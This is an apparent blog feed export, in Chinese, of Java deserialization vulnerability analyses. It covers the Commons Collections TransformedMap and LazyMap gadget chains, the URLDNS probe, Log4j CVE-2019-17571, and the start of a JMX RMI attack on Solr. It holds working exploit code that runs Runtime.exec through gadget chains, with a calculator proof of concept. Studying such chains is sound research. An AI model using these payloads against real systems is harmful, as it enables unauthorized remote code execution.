class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">    <span class="keyword">new</span> Object[] &#123;<span class="string">"open /Applications/Calculator.app"</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">map.put(<span class="string">"1"</span>, <span class="string">"2"</span>);</span><br><span class="line">Map transformedmap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br></pre></td></tr></table></figure></p>
<p>现在只需找到在某个类的 <code>readObject</code> 方法中直接或者间接调用 <code>TransformedMap.checkSetValue()</code> 即可。<br>直接看到反序列化利用链的 <code>AnnotationInvocationHandler.readObject</code> 方法：<br><img src="http://x-f1v3.github.io/images/1604563271107.png" alt="image"></p>
<p><code>this.memberValues</code> 和 <code>this.type</code> 都可以通过构造方法传入，也就是都是我们可控制的，<code>this.memberValues</code> 是 <code>Map</code> 类型，先不管前面的各种判断，假设都成立，定位到 $\color{rgb(255,0,0)}{var5.setValue}$，<code>var5</code> 就是传入 <code>map</code> 的一个 <code>Entry</code> 类，实际我们传入的是 <code>map</code> 的子类 <code>TransformedMap</code>, 而 <code>TransformedMap</code> 并没有 <code>setValue</code> 方法，所以往上追溯到其直接父类 <code>AbstractInputCheckedMapDecorator</code>:<br><img src="http://x-f1v3.github.io/images/1604563282617.png" alt="image"></p>
<p>可以看到，<code>setValue</code> 方法中，正好执行了 <code>checkSetValue</code> 方法，在父类中，<code>checkSetValue</code> 是抽象方法，所以会执行子类中的 <code>checkSetValue</code> ，也就是 <code>TransformedMap.checkSetValue()</code>,达到了我们想要的目的，至于具体如何执行到这个 <code>setValue</code> 方法，涉及到 <code>Map</code> 里的静态内部类 <code>MapEntry</code>、<code>EntrySet</code>和其他方法的联动，就不再赘述了。<br>重新整理 payload,加上利用 <code>AnnotationInvocationHandler.readObject</code>的部分：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125; ),</span><br><span class="line">    <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">    <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">    <span class="keyword">new</span> Object[] &#123;<span class="string">"open /Applications/Calculator.app"</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">map.put(<span class="string">"1"</span>, <span class="string">"2"</span>);</span><br><span class="line">Map transformedmap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object ins = cons.newInstance(注解类,transformedmap);</span><br></pre></td></tr></table></figure></p>
<p>现在就剩下最后一个问题了，就是如何满足 <code>readObject</code> 中的各种条件，重新看到该方法：<br><img src="http://x-f1v3.github.io/images/1604563296689.png" alt="image"></p>
<p>从构造方法可以看出 <code>this.type</code> 是注解类，<br><code>var2 = AnnotationType.getInstance(this.type)</code> 是获取该注解类的详细信息，<br><code>Map var3 = var2.memberTypes();</code> 获取该注解类的成员变量的名称及类型，这里需要对 java 的注解有个基本了解，以 <code>javax.xml.ws.Action</code> 这个注解为例，<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention</span>(RetentionPolicy.RUNTIME)</span><br><span class="line"><span class="meta">@Target</span>(ElementType.METHOD)</span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Action &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//input是成员变量，String 是其类型，默认值是""</span></span><br><span class="line">    <span class="function">String <span class="title">input</span><span class="params">()</span> <span class="keyword">default</span> ""</span>;</span><br><span class="line">    <span class="function">String <span class="title">output</span><span class="params">()</span> <span class="keyword">default</span> ""</span>;</span><br><span class="line">    FaultAction[] fault() <span class="keyword">default</span> &#123; &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>接下来就是对传入的 <code>this.memberValues</code> 和 <code>this.type</code> 相互校验：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">    Entry var5 = (Entry)var4.next();</span><br><span class="line">    <span class="comment">// var6 是 传入 map 的 key 值</span></span><br><span class="line">    String var6 = (String)var5.getKey();</span><br><span class="line">    <span class="comment">// var7 是根据 var6 取出的 注解成员变量的类，</span></span><br><span class="line">    Class var7 = (Class)var3.get(var6);</span><br><span class="line">    <span class="comment">// var7 不为空，也就是说传入 map 的 key 必须是传入注解类的 成员变量名</span></span><br><span class="line">    <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">        Object var8 = var5.getValue();</span><br><span class="line">        <span class="comment">//传入 map 的 value 值必须不是传入注解类的成员变量的类的实例化对象，</span></span><br><span class="line">        <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">            var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">"["</span> + var8 + <span class="string">"]"</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>很明显的看出传入的 <code>map</code> 类和注解类要满足相关的条件，假设传入的注解类是 <code>javax.xml.ws.Action</code> ,那么按照以上分析的要求，<code>map</code> 的操作可以是<code>map.put(&quot;input&quot;, 1);</code>。<br>最终的 payload：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125; ),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[] &#123;<span class="string">"open /Applications/Calculator.app"</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"> Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">map.put(<span class="string">"input"</span>, <span class="number">1</span>);</span><br><span class="line"> Map transformedmap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">  Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">Object ins = cons.newInstance(javax.xml.ws.Action.class,transformedmap);</span><br><span class="line"> <span class="keyword">try</span>&#123;</span><br><span class="line">    ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"tmp.cer"</span>));</span><br><span class="line">    outputStream.writeObject(ins);</span><br><span class="line">    outputStream.close();</span><br><span class="line">     ObjectInputStream inputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"tmp.cer"</span>));</span><br><span class="line">    inputStream.readObject();</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="http://x-f1v3.github.io/images/1604563313656.png" alt="image"></p>
<h3 id="Payload2"><a href="#Payload2" class="headerlink" title="Payload2"></a>Payload2</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                Map(Proxy).entrySet()</span><br><span class="line">                    AnnotationInvocationHandler.invoke()</span><br><span class="line">                        LazyMap.get()</span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">                                ConstantTransformer.transform()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Class.getMethod()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.getRuntime()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></table></figure>
<p>从 <code>ChainedTransformer.transform()</code> 往下之前都分析过了，直接看到 <code>LazyMap.get()</code><br><img src="http://x-f1v3.github.io/images/1604563326217.png" alt="image"></p>
<p>在 <code>get</code> 方法中，当 <code>map</code> 不包含 <code>key</code> 时，会执行 <code>this.factory.transform(key)</code>,其中 <code>this.factory</code> 是传入的 <code>Transformer</code> 类，这和下面的 <code>ChainedTransformer</code> 利用链就可以联动了。<br>代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">           new ConstantTransformer(Runtime.class),</span><br><span class="line">           new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123; String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0] &#125;),</span><br><span class="line">           new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123; Object.class, Object[].class&#125;, new Object[]&#123; null ,new Object[0]&#125; ),</span><br><span class="line">           new InvokerTransformer(&quot;exec&quot;,</span><br><span class="line">                   new Class[] &#123;String.class &#125;,</span><br><span class="line">                   new Object[] &#123;&quot;open /Applications/Calculator.app&quot;&#125;)</span><br><span class="line">   &#125;;</span><br><span class="line">Transformer transformerChain = new ChainedTransformer(transformers);</span><br><span class="line">Map innerMap = new HashMap();</span><br><span class="line">//调用 decorate 方法，返回 LazyMap 的实例</span><br><span class="line">Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">lazyMap.get(&quot;A&quot;);</span><br></pre></td></tr></table></figure></p>
<p><img src="http://x-f1v3.github.io/images/1604563338653.png" alt="image"></p>
<p>接下来是 <code>Map(Proxy).entrySet()</code><br>这里需要些 Java 动态代理的知识。简单的说，就是使用 JDK 动态代理时，会调用动态代理类的 invoke 方法，<br>而每一个动态代理类都必须要实现 <code>InvocationHandler</code> 这个接口,在看 <code>AnnotationInvocationHandler</code> ,就是一个动态代理类，<br><img src="http://x-f1v3.github.io/images/1604563349603.png" alt="image"></p>
<p>看到它的 <code>invoke</code> 方法，其中就有 <code>Object var6 = this.memberValues.get(var4);</code>，如果 <code>this.memberValues</code> 是构造好的 <code>LazyMap</code> 就能执行 <code>LazyMap.get()</code>了。<br>如何完成动态代理呢？一般通过 <code>Proxy</code> 的 <code>newProxyInstance</code> 完成动态代理</p>
<blockquote>
<p>public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces,  InvocationHandler h)  throws IllegalArgumentException</p>
<p>loader: 定义了由哪个ClassLoader对象来对生成的代理对象进行加载,<br>interfaces: 将要给需要代理的对象提供一组什么接口，<br>h: 要调用实现的那种接口中的方法，会跳转到由这个代理对象关联到的 handler 中的invoke方法去执行,</p>
</blockquote>
<p>很明显，动态代理的 <code>InvocationHandler</code> 就是 <code>AnnotationInvocationHandler</code> 了。</p>
<p>继续看 <code>AnnotationInvocationHandler.readObject</code><br><img src="http://x-f1v3.github.io/images/1604563367123.png" alt="image"></p>
<p>其中有 <code>Map(Proxy).entrySet()</code> 对应到了 <code>this.memberValues.entrySet().iterator()</code>，也可以从 <code>AnnotationInvocationHandler</code> 的构造方法可以看出 <code>this.memberValues</code> 是 <code>Map</code> 类。如果反序列化入口点只能是 <code>AnnotationInvocationHandler</code> 类的话，那么最明显的思路就是初始化 <code>AnnotationInvocationHandler</code> 类的 <code>Map</code> 是经过传入 <code>lazyMap</code> 的 <code>AnnotationInvocationHandler</code> 实例动态代理的 <code>Map</code>。稍微有点绕口，代码比较清晰。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Constructor handler_constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class.class,Map.class); </span><br><span class="line">handler_constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">InvocationHandler map_handler = (InvocationHandler) </span><br><span class="line"><span class="comment">//初始化AnnotationInvocationHandler，传入特殊构造的lazyMap</span></span><br><span class="line"><span class="comment">//这个AnnotationInvocationHandler实例，是作为动态代理的handler，</span></span><br><span class="line"><span class="comment">//所以，当执行代理对象的接口方法时，会关联到 handler 的 invoke 方法去执行</span></span><br><span class="line">handler_constructor.newInstance(Override.class,lazyMap); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用之前的 handler 处理动态代理 Map 对象</span></span><br><span class="line">Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,map_handler); </span><br><span class="line"></span><br><span class="line"><span class="comment">//这里的AnnotationInvocationHandler是作为反序列化readObject的入口点</span></span><br><span class="line">Constructor AnnotationInvocationHandler_Constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">AnnotationInvocationHandler_Constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);</span><br></pre></td></tr></table></figure></p>
<p>完整 Payload<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123; String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123; Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123; <span class="keyword">null</span> ,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125; ),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[] &#123;<span class="string">"open /Applications/Calculator.app"</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">HashMap innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map lazyMap = LazyMap.decorate(innermap, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化AnnotationInvocationHandler，传入特殊构造的lazyMap</span></span><br><span class="line"><span class="comment">//这个AnnotationInvocationHandler实例，是作为动态代理的handler，</span></span><br><span class="line"><span class="comment">//所以，当执行代理对象的接口方法时，会关联到 handler 的 invoke 方法去执行</span></span><br><span class="line">Constructor handler_constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">handler_constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,lazyMap); <span class="comment">//创建第一个代理的handler</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用之前的 handler 处理动态代理 Map 对象</span></span><br><span class="line">Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> Class[]&#123;Map.class&#125;,map_handler); <span class="comment">//创建proxy对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这里的AnnotationInvocationHandler是作为反序列化 readObject 的入口点</span></span><br><span class="line">Constructor AnnotationInvocationHandler_Constructor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">AnnotationInvocationHandler_Constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);</span><br></pre></td></tr></table></figure></p>
<p><img src="http://x-f1v3.github.io/images/1604563382564.png" alt="image"></p>
]]></content>
      
        <categories>
            
            <category> Java代码审计 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[URLDNS 反序列化]]></title>
      <url>//blog/1597283762460.html</url>
      <content type="html"><![CDATA[<p>URLDNS 反序列化<br><a id="more"></a></p>
<h2 id="触发流程"><a href="#触发流程" class="headerlink" title="触发流程"></a>触发流程</h2><p>利用链<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">  HashMap.putVal()</span><br><span class="line">    HashMap.hash()</span><br><span class="line">      URL.hashCode()</span><br></pre></td></tr></table></figure></p>
<p>调试分析，重点看到 <code>HashMap#readObject</code> 的 <code>putVal</code> 方法：<br><img src="http://x-f1v3.github.io/images/1597284283001.png" alt="image"></p>
<p>调用 <code>hash()</code> 来处理 key,看到 <code>hash()</code> 方法：<br><img src="http://x-f1v3.github.io/images/1597284300345.png" alt="image"></p>
<p>调用 key 的 <code>hashCode()</code> 方法，跳到 <code>URL</code> 类的 <code>hashCode()</code><br><img src="http://x-f1v3.github.io/images/1597284318196.png" alt="image"></p>
<p>如果 <code>hashCode</code> 等于 <code>-1</code> ,就会调用 <code>handler.hashCode</code> 方法，这里的 <code>handler</code> 是指 <code>URLStreamHandler</code>,来到 <code>URLStreamHandler.hashCode</code> 方法：<br><img src="http://x-f1v3.github.io/images/1597284330939.png" alt="image"></p>
<p>该方法对 <code>http</code> 协议的各个部分计算 <code>hashCode</code>，其中 <code>getHostAddress</code> 方法就是 DNS 的触发点。跟进该方法：<br><img src="http://x-f1v3.github.io/images/1597284342470.png" alt="image"></p>
<p>其中的 <code>InetAddress.getByName(host)</code> 方法对域名发起了 DNS 查询。</p>
<p>分析完反序列化原理，反过来推 payload.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;();  // 创建HashMap，并在 key 处设置 URL 类</span><br><span class="line">URL url = new URL(&quot;http://xxx.xx.xx&quot;);  //创建 URL 类</span><br><span class="line">Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;); //获取 URL 类的 hashCode 变量</span><br><span class="line">f.setAccessible(true); //设置权限</span><br><span class="line">hashMap.put(url, &quot;1&quot;); //放入 HashMap</span><br><span class="line">f.set(url, -1);   //设置 HashCode 为-1，之前的分析，如果HashCode不是-1，不会调用 handler.hashCode 重新计算 HashCode</span><br><span class="line">ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;tmp.cer&quot;));</span><br><span class="line">oos.writeObject(hashMap); //序列化写入文件</span><br></pre></td></tr></table></figure></p>
<p>最开始的设想是这样的，但是实际运行之后，发现会有2次 DNS 记录，分析原因是 <code>hashMap.put(url, &quot;1&quot;);</code> 这里同样会调用 <code>putVal</code> 方法，再走一遍上述流程，<br><img src="http://x-f1v3.github.io/images/1597284351253.png" alt="image"></p>
<p>所以在 <code>put</code> 之前也要更改 <code>HashCode</code> 为不是-1的值，这样就不会调用  <code>handler.hashCode</code> 计算 <code>hashcode</code>.<br>最后的 payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;URL, String&gt; hashMap = new HashMap&lt;URL, String&gt;();  // 创建HashMap，并在 key 处设置 URL 类</span><br><span class="line">URL url = new URL(&quot;http://xxx.xx.xx&quot;);   //创建 URL 类</span><br><span class="line">Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);  //获取 URL 类的 hashCode 变量</span><br><span class="line">f.setAccessible(true); //设置权限</span><br><span class="line">f.set(url, -122); //HashCode不是-1，不会调用 handler.hashCode 重新计算 HashCode </span><br><span class="line">hashMap.put(url, &quot;1&quot;); //放入 HashMap</span><br><span class="line">f.set(url, -1);  //设置 HashCode 为-1，之前的分析，如果HashCode不是-1，不会调用 handler.hashCode 重新计算 HashCode</span><br><span class="line"> ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;tmp.cer&quot;));</span><br><span class="line">oos.writeObject(hashMap); //序列化写入文件</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CVE-2019-17571]]></title>
      <url>//blog/1577679142463.html</url>
      <content type="html"><![CDATA[<p>CVE-2019-17571/Apache Log4j 反序列化远程代码执行漏洞<br><a id="more"></a></p>
<p>用的是 <code>Apache Log4j 1.2.17</code> 版本，<code>sink</code> 在 <code>org.apache.log4j.net.SocketNode</code> 类中：</p>
<p><img src="http://x-f1v3.github.io/images/1577679232280.png" alt="image"></p>
<p>在构造函数中，传入 socket 传输的数据流，然后在 <code>run</code> 方法中直接调用 <code>readObject()</code> 反序列化。</p>
<p>查找在哪些类中会调用 <code>SocketNode</code> 类，发现 <code>SocketServer</code>、<code>SimpleSocketServer</code> 类中都有调用：<br><img src="http://x-f1v3.github.io/images/1577679244091.png" alt="image"></p>
<p><img src="http://x-f1v3.github.io/images/1577679259398.png" alt="image"></p>
<p>并且由于 <code>SocketNode</code> 是实现 <code>Runnable</code> 接口。所以通过 <code>new Thread().start()</code> 方法能执行其 <code>run</code> 方法造成反序列化代码执行漏洞。</p>
<p>复现漏洞可以通过调用 <code>SocketServer</code>、<code>SimpleSocketServer</code> 类，或者自己实现都可以。</p>
<p>当然，任意代码执行的话还需要调用其他可以的 <code>gadget</code> .比如 <code>Jdk7u21</code>、<code>CommonsCollections1</code> 之类的。</p>
<p><img src="http://x-f1v3.github.io/images/1577679266375.png" alt="image"></p>
]]></content>
      
        <categories>
            
            <category> 漏洞分析 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[攻击JMX RMI]]></title>
      <url>//blog/1575618238391.html</url>
      <content type="html"><![CDATA[<p>以 Apache Solr 远程代码执行(CVE-2019-12409)为例。<br><a id="more"></a></p>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>下载 8.1.1 版本，结果发现在 solr.in.cmd 默认是 <code>false</code> ，只有在 solr.in.sh 默认才是 <code>true</code>，所以只有在 Linux 上才能触发。<br><img src="http://x-f1v3.github.io/images/1575618795308.png" alt="image"><br><img src="http://x-f1v3.github.io/images/1575618883028.png" alt="image"></p>
<p>在 bin 目录下运行 <code>./solr start</code> 启动 solr<br><img src="http://x-f1v3.github.io/images/1575618943864.png" alt="image"></p>
<p>可以看到默认情况下 <code>18983</code> 是开启的<br><img src="http://x-f1v3.github.io/images/1575618983432.png" alt="image"></p>
<h2 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h2><p>扫描端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  -sV -p 18983 127.0.0.1</span><br></pre></td></tr></table></figure></p>
<p><img src="http://x-f1v3.github.io/images/1575619076487.png" alt="image"></p>
<p>如果是未授权的话，可以直接连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jconsole  127.0.0.1:18983</span><br></pre></td></tr></table></figure></p>
<p><img src="http://x-f1v3.github.io/images/1575619146604.png" alt="image"></p>
